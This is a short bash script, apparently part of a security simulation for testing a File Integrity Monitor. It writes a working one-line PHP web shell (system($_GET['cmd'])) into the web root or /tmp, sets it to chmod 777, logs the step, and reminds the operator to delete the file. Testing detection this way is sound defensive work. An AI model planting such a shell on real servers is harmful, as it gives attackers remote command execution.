#!/bin/bash
source ./common.cfg
# Tenta localizar diretório web comum ou usa /tmp
WEB_ROOT="/var/www/html"
[ ! -w "$WEB_ROOT" ] && WEB_ROOT="/tmp"
WEBSHELL="$WEB_ROOT/b374k_mini.php"

log_event "INICIANDO: Upload de Webshell simulado"
echo "<?php system(\$_GET['cmd']); ?>" > "$WEBSHELL"
chmod 777 "$WEBSHELL"

log_event "CONCLUÍDO: Webshell criada em $WEBSHELL"
echo "OBS: Remova este arquivo manualmente após teste do FIM (File Integrity Monitor)."
